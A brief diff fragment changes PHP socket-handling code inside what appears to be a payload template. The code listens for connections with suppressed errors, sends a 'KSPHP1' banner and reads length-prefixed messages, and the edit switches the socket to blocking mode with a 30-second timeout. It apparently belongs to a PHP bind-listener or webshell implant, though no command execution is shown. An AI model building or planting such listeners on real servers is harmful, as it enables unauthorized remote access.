@@ -42,7 +42,8 @@ if($s){{
   $c=@stream_socket_accept($s,-1);
   if(!$c && function_exists('socket_accept')){{$c=@socket_accept($s);}}
   if($c){{
-  @stream_set_timeout($c,0);
+  @stream_set_blocking($c,true);
+  @stream_set_timeout($c,30);
   fwrite($c,'KSPHP1');
   $l='';
   while(strlen($l)<4 && !feof($c)){{$ch=fread($c,4-strlen($l));if($ch===false||$ch===''){{break;}}$l.=$ch;}}
